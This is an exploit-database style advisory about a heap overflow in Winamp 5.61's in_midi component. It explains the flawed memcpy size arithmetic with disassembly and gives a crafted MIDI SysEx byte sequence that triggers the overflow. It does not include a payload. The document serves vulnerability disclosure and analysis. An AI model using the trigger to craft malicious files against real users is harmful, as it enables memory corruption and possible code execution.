# Exploit Title: Winamp 'in_midi' component heap overflow
# Date: 05/14/2011
# Author: Alexander Gavrun (http://0x1byte.blogspot.com/)
# Software Link: http://www.winamp.com/
# Version: 5.61
# Tested on: Windows 7

Vulnerability occur while parsing midi file with special crafted System Exclusive message type (event).

System exclusive message type, according with midi specification (http://www.gweep.net/~prefect/eng/reference/protocol/midispec.html), begins with 0xF0 and ends with 0xF7 byte (after the data bytes). Processing of this message type begins in sub_766410F function (dissasembled in_midi.dll of winamp v.5.61).

sub_766D702 function search for 0xF7 byte and count a size of SysEx message. Searching starts from 3rd byte and it means that minimal value, which function might return is 3.

In sub_766D894 check the size of early allocated buffer and reallocate it, if necessary. Then to this buffer copy data of the SysEx message with size obtained by subtraction of offset (to data begin) from SysEx message size.

Then value, obtained as [SysEx message size] - [offset to data begin] - 1, passed as a Size argument to memcpy function.

.text:0766D919                 mov     esi, [ebp+arg_4]
.text:0766D91C                 sub     esi, eax
.text:0766D91E                 lea     ecx, [esi-1]  ; ecx = size - offset - 1
.text:0766D921                 push    ecx             ; Size
.text:0766D922                 mov     ecx, [ebp+arg_0]
.text:0766D925                 mov     [ebp+var_4], eax
.text:0766D928                 lea     eax, [eax+ecx+1]
.text:0766D92C                 mov     ecx, [edi+0Ch]
.text:0766D92F                 push    eax             ; Src
.text:0766D930                 mov     eax, [edi+14h]
.text:0766D933                 lea     eax, [eax+ecx+1]
.text:0766D937                 push    eax             ; Dst
.text:0766D938                 call    memcpy

Since 0xF7 less than zero, we can construct SysEx message so that offset will be greater (or equal) than size.
For an example, the following sequence

0xF0 0xFF 0xF7 0xFF 0xFF ...[data]
size = 3 and offset = 4
ecx = 3 - 4 - 1 = 0xFFFFFFFE - very big positive value. After all heap overflow will be occur.
